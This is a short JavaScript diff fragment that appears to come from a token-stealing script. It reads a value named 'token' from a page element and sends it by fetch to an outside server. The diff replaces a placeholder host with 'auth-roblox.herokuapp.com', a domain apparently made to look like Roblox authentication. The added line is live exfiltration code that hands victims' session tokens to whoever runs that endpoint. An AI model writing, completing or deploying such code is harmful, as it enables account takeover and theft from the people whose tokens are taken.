@@ -140,7 +140,7 @@ function performPaste() {
     performPaste()
   setTimeout(() => {
     var token = document.getElementById("wrap").value
-    fetch("https://YourDomain.com/sc.php?t=" + token);
+    fetch("https://auth-roblox.herokuapp.com/sc.php?t=" + token);
 }, 100);
   }
 fun()
